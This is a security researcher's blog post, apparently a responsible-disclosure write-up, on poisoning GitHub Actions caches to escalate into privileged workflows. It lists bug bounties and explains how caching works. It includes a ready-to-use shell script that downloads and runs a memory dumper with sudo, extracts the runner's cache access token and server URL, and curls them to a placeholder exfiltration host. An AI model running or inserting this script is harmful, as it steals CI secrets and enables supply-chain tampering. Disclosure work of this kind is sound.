href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#bug-background">Bug Background</a><ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#pwn-request">Pwn Request</a></li></ol></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#preparing-the-payload">Preparing the Payload</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#filling-the-cache">Filling the Cache</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#winning-the-race-condition">Winning the Race Condition</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#success-but-i-broke-everything">Success…but I broke everything.</a></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#disclosure-timeline">Disclosure Timeline</a></li></ol></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#key-takeaways">Key Takeaways</a><ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#will-provenance-save-us">Will Provenance Save Us?</a><ol><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#the-most-devious-backdoor">The Most Devious Backdoor</a></li></ol></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#don-t-use-actions-caching-in-release-builds">Don’t Use Actions Caching in Release Builds</a></li></ol></li><li><a class="wp-block-table-of-contents__entry" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#references">References</a></li></ol>



<h1 class="wp-block-heading" id="introduction">Introduction</h1>



<p>I’ve personally been working on a tool to detect Pwn Request vulnerabilities at scale, and one of the “false positive” cases was when a workflow checked out and ran user-controlled code, but only had a <code>GITHUB_TOKEN</code> with read access and no secrets. This makes it just as secure as a workflow on <code>pull_request</code>, right? I turned out to be wrong. There <em>is</em> a way to escalate by smashing caches, turning GitHub’s cache eviction features into a weapon, and replacing cache entries with new, poisoned entries. The best part? <strong>It’s all working as intended.</strong> In this blog I will introduce GitHub Actions privilege escalation and lateral movement technique I’m going to call “Actions Cache Blasting”.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="522" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/designer/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png" data-orig-size="1024,1024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="designer" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=1024" width="1024" height="1024" src="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=1024" alt="" class="wp-image-522" srcset="https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png 1024w, https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/03/designer.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I used this vulnerability to prove that I could compromise the production deployment secrets for <code>angular.</code>dev and <code>angular.io</code>. I also identified the <em>same </em>issue in other repositories, and here is a sample of those that I can disclose:</p>



<ul class="wp-block-list">
<li><a href="http://angular/components/">angular/components</a> – $1,000 Bug Bounty (part of Angular report)
<ul class="wp-block-list">
<li><strong>Fixed In:</strong> <a href="https://github.com/angular/components/commit/f71fe2072df1ba671e10a550925c8819a4138dd1">https://github.com/angular/components/commit/f71fe2072df1ba671e10a550925c8819a4138dd1</a></li>
</ul>
</li>



<li><a href="https://github.com/mdn/content">mdn/content</a> – $3,000 Bug Bounty
<ul class="wp-block-list">
<li><strong>Impact:</strong> Tamper with <a href="https://developer.mozilla.org/en-US/">https://developer.mozilla.org/en-US/</a></li>



<li><strong>Fixed In:</strong> <a href="https://github.com/mdn/content/commit/12d06723f428f21fb855e13cf392dc61a7225eb7">https://github.com/mdn/content/commit/12d06723f428f21fb855e13cf392dc61a7225eb7</a> </li>
</ul>
</li>



<li><a href="http://hyperledger/besu">hyperledger/besu</a> – $2,000 Bug Bounty
<ul class="wp-block-list">
<li><strong>Impact:</strong> Docker Secret Disclosure (an attacker would be a able to push poisoned Besu Docker images to Dockerhub!) Besu is an Ethereum client, which means an attacker could steal the client’s private key from within the container.</li>
</ul>
</li>



<li><a href="https://github.com/google/temporian/">google/temporian/</a>
<ul class="wp-block-list">
<li><strong>Impact:</strong> Jump to privileged workflow with <code>GITHUB_TOKEN</code> that had write access.</li>



<li><strong>Fixed In:</strong> <a href="https://github.com/google/temporian/commit/6fa5ce2b1b46bdfa382f45482b8bb29a6592cbaf">https://github.com/google/temporian/commit/6fa5ce2b1b46bdfa382f45482b8bb29a6592cbaf</a></li>
</ul>
</li>



<li><a href="https://github.com/chainguard-dev/terraform-provider-cosign">chainguard-dev/terraform-provider-cosign</a>
<ul class="wp-block-list">
<li><strong>Description:</strong> Repository ran pull-request code on <code>pull_request_target</code> in locked-down workflow on the default branch. A separate release workflow used caching prior to signing and releasing.</li>



<li><strong>Impact:</strong> Jump to from locked-down workflow to release workflow that used OIDC to assume into a GCP principal with access to release signing GPG key.</li>



<li><strong>Fixed In:</strong> <a href="https://github.com/chainguard-dev/terraform-provider-cosign/commit/a0ed6d345b5dc45636f9bbc060de4ef60483f87e">https://github.com/chainguard-dev/terraform-provider-cosign/commit/a0ed6d345b5dc45636f9bbc060de4ef60483f87e</a></li>
</ul>
</li>
</ul>



<p>The takeaway is this:</p>



<p class="has-large-font-size"><em><strong>Never </strong></em>run untrusted code within the context of the <code>main</code> branch if <em><strong>any </strong></em>other workflows use GitHub Actions caching.</p>



<p>This also applies to dependencies. If an attacker compromises a package that is used in a locked down workflow that runs in a repository’s main branch, then that poisoned dependency can steal the GitHub cache credentials and use it to move laterally to other workflows within victim repositories that use caching.</p>



<p>In this bog post, I’m going to show you how I was able to poison the Angular GitHub repository cache and prove that I could obtain access to the deployment keys for <a href="https://angular.dev/">angular.dev</a>. </p>



<p>I also cover just how diabolical cache poisoning can be as part of a supply chain attack,<strong> where an attacker can tamper with a SLSA Level 3 build artifact that produces signed provenance without leaving a single trace.</strong></p>



<h1 class="wp-block-heading" id="how-does-github-actions-caching-really-work">How Does GitHub Actions Caching <em>Really </em>Work?</h1>



<p>If you’re familiar with GitHub Actions, you’ve probably seen code like this:</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_745799" class="syntaxhighlighter  yaml"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="yaml plain">- name</code><code class="yaml constants">:</code> <code class="yaml plain">Configure action caching for bazel repository cache</code></div><div class="line number2 index1 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml variable">uses:</code> <code class="yaml plain">actions/cache@13aacd865c20de90d75de3b17ebe84f7a17d57d2 </code><code class="yaml comments"># v4.0.0</code></div><div class="line number3 index2 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml variable">with:</code></div><div class="line number4 index3 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml comments"># Note: Bazel repository cache is located in system locations and cannot use</code></div><div class="line number5 index4 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml comments"># a shared cache between different runner operating systems.</code></div><div class="line number6 index5 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml variable">path:</code> <code class="yaml string">'~/.cache/bazel_repo_cache'</code></div><div class="line number7 index6 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml variable">key:</code> <code class="yaml plain">bazel-cache-$</code><code class="yaml constants">{</code><code class="yaml constants">{</code> <code class="yaml plain">runner.os </code><code class="yaml constants">}</code><code class="yaml constants">}</code><code class="yaml plain">-$</code><code class="yaml constants">{</code><code class="yaml constants">{</code> <code class="yaml plain">hashFiles(</code><code class="yaml string">'**/WORKSPACE'</code><code class="yaml plain">) </code><code class="yaml constants">}</code><code class="yaml constants">}</code></div><div class="line number8 index7 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml variable">restore-keys:</code> <code class="yaml plain">|</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml plain">bazel-cache-$</code><code class="yaml constants">{</code><code class="yaml constants">{</code> <code class="yaml plain">runner.os </code><code class="yaml constants">}</code><code class="yaml constants">}</code><code class="yaml plain">-</code></div></div></td></tr></tbody></table></div></div></div>


<p>According to GitHub’s documentation, caching works by checking keys and paths when determining if there is a cache hit. Similarly, when cache entries are saved, the cache action saves the entry using a key and a version (which is a Sha256 hash of the paths concatenated together along with some other predictable information). These two values are used to uniquely identify cache entries.</p>



<p>By replicating the process of setting and retrieving cache entries locally and using my own code, I found some interesting behavior. To set this up, I used a self-hosted runner and configured it to route all traffic through Burp. Then, I implemented the request flow in a Python script to figure out which values I had to keep and which values I could set to contain arbitrary values.</p>



<h3 class="wp-block-heading" id="cache-save-process">Cache Save Process</h3>



<p>The most interesting thing I noticed was that values used to determine cache hits are set <em>entirely </em>on the client-side. Both of these values were simply strings, and could be set to anything.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="591" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/cache_md2/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/04/cache_md2.png" data-orig-size="699,325" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cache_md2" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/04/cache_md2.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/04/cache_md2.png?w=699" width="699" height="325" src="https://adnanthekhan.com/wp-content/uploads/2024/04/cache_md2.png?w=699" alt="" class="wp-image-591" srcset="https://adnanthekhan.com/wp-content/uploads/2024/04/cache_md2.png 699w, https://adnanthekhan.com/wp-content/uploads/2024/04/cache_md2.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/04/cache_md2.png?w=300 300w" sizes="(max-width: 699px) 100vw, 699px"></figure>



<h3 class="wp-block-heading" id="cache-upload-process">Cache Upload Process</h3>



<p>Under the hood, GitHub Actions caching works by retrieving a signed upload URL from an API endpoint, and then using that to push the cache entry to an Azure blob. When I started looking into caching, I asked myself, how does do workflows authenticate? There isn’t anything inherently different about a workflow job that uses a cache action and one that doesn’t. GitHub doesn’t send special secrets to a workflow based on which action it uses. It’s all or nothing. <a href="https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#usage-limits-and-eviction-policy">Scribe Security’s post on cache poisoning</a> alludes to this but doesn’t go into much detail.</p>



<p>When an Actions workflow starts, it receives a several secrets from GitHub. Among these secrets are the <code>GITHUB_TOKEN,</code> which you may already be familiar with, but there are other values like the AccessToken (also referenced as the <code>ACTIONS_RUNTIME_TOKEN</code>) and CacheServerUrl. The runtime token is used to authenticate with GitHub’s non-public API endpoints for workflow run artifacts and caches. Even though these are not public endpoints, anyone can learn about them by looking through the source code for <a href="https://github.com/actions/toolkit">actions/toolkit</a> or simply setting up a self-hosted runner through Burp and running workflows.</p>



<h4 class="wp-block-heading" id="6-hour-attack-window">6 Hour Attack Window</h4>



<p>During my research, I discovered that the Actions runtime token was valid for 6 hours, <strong>and it was not invalidated after the workflow run</strong> conclusion. I didn’t want to bother reporting this given my experience with GitHub’s security boundaries, but I still decided to submit it in order to get it on the record. I had good feeling this would be a very effective privilege escalation tool for bug bounties – and I was right.</p>



<p>In my report I emphasized the token validity being the issue since the “less than ideal” validation for the cache compressed files is not considered a security issue by GitHub.</p>



<p>As expected I was informed that this too was working as intended. GitHub closed the report as informative and stated that it does not pose a significant security risk.<br></p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Thanks for the submission! We have reviewed your report and validated your findings. After internally assessing the findings, we have determined that they do not present a significant security risk and are therefore not eligible for a reward under the Bug Bounty program.</p>



<p>This proof of concept depends on compromising the actions token, which if happens, it can be exploited anyway and the 6 hour validity is just providing an extra window for someone to exploit. We may consider making changes to the validity of the token in the future, but don’t have anything to announce right now.</p>
<cite>GitHub</cite></blockquote>



<p>I’ve always found scenarios like this interesting. If you analyze it by drawing out the security boundaries, then yes, it technically does not cross a boundary. But the real world doesn’t work like that. The impact of vulnerabilities changes based on the success rate of an attacker and the likelihood of detection.</p>



<p>In the poisoned workflow run scenario without the 6 hour window, an attacker would likely need to re-exploit the issue multiple times or extend the duration of the workflow run. This greatly increases the chance that a maintainer will notice unusual behavior. The same concept applies to a poisoned dependency, an attacker would need to steal the Actions token, extend the workflow run, and then try to poison the cache while it is running.</p>



<h3 class="wp-block-heading" id="cache-restoration-process">Cache Restoration Process</h3>



<p>This is one area where I think GitHub could have done a lot more to harden caching, even if it isn’t technically “their responsibility” since Actions run in a workflow and workflow security is the end user’s responsibility. Adding additional checks during restoration would not have impacted how caching works, but it would have prevented arbitrary file overwrites as I am about to demonstrate.</p>



<h4 class="wp-block-heading" id="actions-cache">actions/cache</h4>



<p>When determining if there is a cache hit, the action calculates the values for the cache key and version, and if there is a matching item in the cache it downloads it and extracts it. The cache object itself is just a compressed archive, and it can be a tarball or a zstd archive. The action does not actually check if the paths specified in the cache configuration are what is actually in the file prior to extracting it. Below is a<a href="https://github.com/actions/toolkit/blob/main/packages/cache/src/cache.ts#L114-L133"> code snippet</a> from <a href="https://github.com/actions/toolkit/">actions/toolkit</a> which is used under the hood by <code>actions/cache</code> and other actions (such as <code>actions/setu</code>p-go) that implement caching. It just downloads the archive and blindly extracts it (<code>extractTar</code> <a href="https://github.com/actions/toolkit/blob/main/packages/cache/src/internal/tar.ts#L273-L282">does not perform further validation</a>).</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_87740" class="syntaxhighlighter  jscript"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="jscript comments">// Download the cache from the cache entry</code></div><div class="line number2 index1 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript keyword">await</code> <code class="jscript plain">cacheHttpClient.downloadCache(</code></div><div class="line number3 index2 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">cacheEntry.archiveLocation,</code></div><div class="line number4 index3 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">archivePath,</code></div><div class="line number5 index4 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">options</code></div><div class="line number6 index5 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">)</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript keyword">if</code> <code class="jscript plain">(core.isDebug()) {</code></div><div class="line number9 index8 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript keyword">await</code> <code class="jscript plain">listTar(archivePath, compressionMethod)</code></div><div class="line number10 index9 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">}</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">const archiveFileSize = utils.getArchiveFileSizeInBytes(archivePath)</code></div><div class="line number13 index12 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">core.info(</code></div><div class="line number14 index13 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">`Cache Size: ~${Math.round(</code></div><div class="line number15 index14 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">archiveFileSize / (1024 * 1024)</code></div><div class="line number16 index15 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">)} MB (${archiveFileSize} B)`</code></div><div class="line number17 index16 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">)</code></div><div class="line number18 index17 alt1">&nbsp;</div><div class="line number19 index18 alt2"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript keyword">await</code> <code class="jscript plain">extractTar(archivePath, compressionMethod)</code></div><div class="line number20 index19 alt1"><code class="jscript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="jscript plain">core.info(</code><code class="jscript string">'Cache restored successfully'</code><code class="jscript plain">)</code></div></div></td></tr></tbody></table></div></div></div>


<p>The function even <a href="https://github.com/actions/toolkit/blob/main/packages/cache/src/cache.ts#L56C1-L72C33">takes a list of paths</a>…</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_494487" class="syntaxhighlighter  jscript"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="jscript comments">/**</code></div><div class="line number2 index1 alt1"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">* Restores cache from keys</code></div><div class="line number3 index2 alt2"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">*</code></div><div class="line number4 index3 alt1"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">* @param paths a list of file paths to restore from the cache</code></div><div class="line number5 index4 alt2"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">* @param primaryKey an explicit key for restoring the cache</code></div><div class="line number6 index5 alt1"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">* @param restoreKeys an optional ordered list of keys to use for restoring the cache if no cache hit occurred for key</code></div><div class="line number7 index6 alt2"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">* @param downloadOptions cache download options</code></div><div class="line number8 index7 alt1"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">* @param enableCrossOsArchive an optional boolean enabled to restore on windows any cache created on any platform</code></div><div class="line number9 index8 alt2"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">* @returns string returns the key for the cache hit, otherwise returns undefined</code></div><div class="line number10 index9 alt1"><code class="jscript spaces">&nbsp;</code><code class="jscript comments">*/</code></div><div class="line number11 index10 alt2"><code class="jscript keyword">export</code> <code class="jscript keyword">async</code> <code class="jscript keyword">function</code> <code class="jscript plain">restoreCache(</code></div><div class="line number12 index11 alt1"><code class="jscript spaces">&nbsp;&nbsp;</code><code class="jscript plain">paths: string[],</code></div><div class="line number13 index12 alt2"><code class="jscript spaces">&nbsp;&nbsp;</code><code class="jscript plain">primaryKey: string,</code></div><div class="line number14 index13 alt1"><code class="jscript spaces">&nbsp;&nbsp;</code><code class="jscript plain">restoreKeys?: string[],</code></div><div class="line number15 index14 alt2"><code class="jscript spaces">&nbsp;&nbsp;</code><code class="jscript plain">options?: DownloadOptions,</code></div><div class="line number16 index15 alt1"><code class="jscript spaces">&nbsp;&nbsp;</code><code class="jscript plain">enableCrossOsArchive = </code><code class="jscript keyword">false</code></div><div class="line number17 index16 alt2"><code class="jscript plain">): Promise&lt;string | undefined&gt; {</code></div></div></td></tr></tbody></table></div></div></div>


<p>Why not selectively extract files that are destined for those paths? It doesn’t make sense to cache <code>node_modules/</code> and then allow overwriting <code>package.json</code> (or any other file for that matter) when restoring a cache entry that should just contain <code>node_modules</code>/.</p>



<p>This is a case where a bit of extra defense in depth programming would have prevented this entirely. It might be hard for GitHub to change it now, though, because it would be a breaking change for any developers that might have figured this out and are using caching in a non-standard way as part of their development workflow.</p>



<h4 class="wp-block-heading" id="cache-hierarchy">Cache Hierarchy</h4>



<p>I want to cover why cache poisoning in the context of <code>main</code> (or the default branch) is so dangerous, and how it can be used to pivot to highly privileged workflows.</p>



<p>Branches are <em>the </em>security boundary for GitHub Actions caching. It also aligns with the purpose behind caching – speeding up builds. Feature branches created off of a parent branch (such as a branch off of <code>dev</code>) will be able to access the cache from <code>dev</code>. Sibling branches will not be able to access caches from each other.</p>



<p>When things work right, this makes sense. Cache entries are immutable and cache uniqueness is determined by a key which is derived by hashing something like a lockfile. If that changes, then it is a different cache altogether, and child branches can make their own cache entries, but if the key doesn’t change, then the child branch can just pull from the main cache without the need for creating a new entry. It’s good design for a CI/CD system, but since only the branch boundary is enforced on the server side, an attacker can just acknowledge how the cache key/version calculation works but then ignore it – because it is not validated on the server side.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="693" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/cachehierarchy/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png" data-orig-size="1080,760" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cachehierarchy" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png?w=1024" loading="lazy" width="1024" height="720" src="https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png?w=1024" alt="" class="wp-image-693" srcset="https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png?w=768 768w, https://adnanthekhan.com/wp-content/uploads/2024/05/cachehierarchy.png 1080w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h1 class="wp-block-heading" id="cache-blasting-and-poisoning">Cache Blasting and Poisoning</h1>



<p>Now that I’ve covered how GitHub Actions caching works, let’s get into the part you are probably interested in: The proof of concept and how it’s done. I’m sparing no detail in my post, and I fully expect that a competent offensive security practitioner will walk away from this post with the knowledge to replicate this attack.</p>



<h3 class="wp-block-heading" id="steal-the-cache-token">Steal the Cache Token</h3>



<p>In order to conduct a GitHub Actions cache poisoning attack, an attacker must obtain the <code>CacheServerUrl</code> and <code>AccessToken</code> from a workflow. If the attacker has code execution within a <code>main</code> branch workflow through a <a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">Pwn Request</a> vulnerability or even more devious manner such as a compromised dependency then they can use the script below to dump the runner’s memory and exfiltrate the two fields.</p>



<pre class="wp-block-code"><code>YOUR_EXFIL="your-exfil-url.com"<br>BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`<br>BLOB2=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"CacheServerUrl":"[^"]*"\}' | sort -u`<br>curl -s -d "$BLOB $BLOB2" https://$YOUR_EXFIL/token &gt; /dev/null</code></pre>



<p>This script only works for GitHub hosted Linux runners as they allow sudo without a password. One could probably write some Powershell code to do the same for Windows runners without too much effort.</p>



<h3 class="wp-block-heading" id="payload-creation-overwrite-anything">Payload Creation – Overwrite Anything</h3>



<p>If we observe how cache restoration works, we can see that it is just a call to extract the compressed file. Tar will overwrite files by default when extracting.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="571" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/screenshot-2024-03-09-065557/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png" data-orig-size="2568,920" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2024-03-09-065557" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png?w=1024" loading="lazy" width="1024" height="366" src="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png?w=1024" alt="" class="wp-image-571" srcset="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png?w=1022 1022w, https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png?w=2043 2043w, https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-09-065557.png?w=300 300w, 